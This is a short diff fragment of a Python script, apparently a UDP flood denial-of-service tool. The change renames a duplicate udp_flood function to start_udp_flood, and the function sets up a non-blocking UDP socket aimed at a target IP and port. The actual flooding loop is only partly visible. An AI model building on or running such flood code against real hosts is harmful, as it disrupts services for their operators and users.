@@ -30,7 +30,7 @@ def udp_flood(target_ip, target_port, stop_flag):
         except Exception as e:
             logging.error(f"Error sending packets: {e}")
             break
-def udp_flood(target_ip, target_port, stop_flag):
+def start_udp_flood(target_ip, target_port, stop_flag):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     sock.setblocking(False)  # Non-blocking mode
